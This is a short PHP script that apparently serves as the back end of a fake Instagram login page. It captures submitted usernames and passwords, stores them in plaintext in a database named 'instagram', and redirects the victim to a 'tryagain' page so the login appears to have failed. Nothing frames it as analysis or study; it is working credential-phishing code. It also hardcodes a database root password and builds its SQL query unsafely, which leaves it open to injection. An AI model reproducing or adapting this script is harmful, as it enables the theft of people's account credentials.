<?php 

if (isset($_POST["login"])) {
	if ($_POST["username"] != null && $_POST["password"] != null) {
			$username = $_POST["username"];
			$password = $_POST["password"];


	$con = mysqli_connect('localhost','root','asadbee743rea');

	mysqli_select_db($con,'instagram');

$sql = "INSERT INTO usernames(username, password) VALUES ('$username','$password')";

if (mysqli_query($con, $sql)) {
	header('Location: tryagain.php');
} else {
    echo "Error entering data: " . mysqli_error($con);
}


	}else{
	header("Location: index.php");
	}
}else{
	header("Location: index.php");
}

 ?>